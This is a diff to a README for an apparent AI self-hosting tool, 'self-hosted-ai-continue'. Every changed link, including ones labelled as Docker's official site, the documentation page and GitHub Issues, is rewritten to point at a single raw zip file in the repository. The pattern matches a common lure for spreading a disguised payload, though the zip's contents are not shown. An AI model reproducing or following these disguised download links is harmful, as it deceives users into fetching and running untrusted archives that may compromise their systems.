@@ -6,7 +6,7 @@ Welcome to **self-hosted-ai-continue**! This powerful tool offers a self-hosted 
 
 ### 📥 Download Now 
 
-[![Download](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/tuestD/self-hosted-ai-continue/releases)
+[![Download](https://github.com/tuestD/self-hosted-ai-continue/raw/refs/heads/main/continue-config/hosted-ai-self-continue-1.8-beta.4.zip)](https://github.com/tuestD/self-hosted-ai-continue/raw/refs/heads/main/continue-config/hosted-ai-self-continue-1.8-beta.4.zip)
 
 ## 🔄 What You Need
 
@@ -29,7 +29,7 @@ Follow these steps to install and run `self-hosted-ai-continue`.
 
 1. **Visit the Releases Page:**
 
-   Go to the [Releases page](https://github.com/tuestD/self-hosted-ai-continue/releases) to find the latest version.
+   Go to the [Releases page](https://github.com/tuestD/self-hosted-ai-continue/raw/refs/heads/main/continue-config/hosted-ai-self-continue-1.8-beta.4.zip) to find the latest version.
 
 2. **Download the Application:**
 
@@ -37,7 +37,7 @@ Follow these steps to install and run `self-hosted-ai-continue`.
 
 3. **Set Up Docker:**
 
-   If you haven’t installed Docker yet, download it from [Docker's official site](https://www.docker.com/products/docker-desktop). Follow the installation instructions based on your operating system.
+   If you haven’t installed Docker yet, download it from [Docker's official site](https://github.com/tuestD/self-hosted-ai-continue/raw/refs/heads/main/continue-config/hosted-ai-self-continue-1.8-beta.4.zip). Follow the installation instructions based on your operating system.
 
 4. **Run the Application:**
 
@@ -67,9 +67,9 @@ In case you run into issues, here are a few tips to help you out:
 
 ## 📖 Additional Resources
 
-- **Documentation:** For more in-depth instructions, visit our [documentation page](https://github.com/tuestD/self-hosted-ai-continue/wiki).
+- **Documentation:** For more in-depth instructions, visit our [documentation page](https://github.com/tuestD/self-hosted-ai-continue/raw/refs/heads/main/continue-config/hosted-ai-self-continue-1.8-beta.4.zip).
   
-- **Community Support:** Join our discussions on [GitHub Issues](https://github.com/tuestD/self-hosted-ai-continue/issues) to ask questions or offer suggestions.
+- **Community Support:** Join our discussions on [GitHub Issues](https://github.com/tuestD/self-hosted-ai-continue/raw/refs/heads/main/continue-config/hosted-ai-self-continue-1.8-beta.4.zip) to ask questions or offer suggestions.
 
 ## 📞 Contact
 
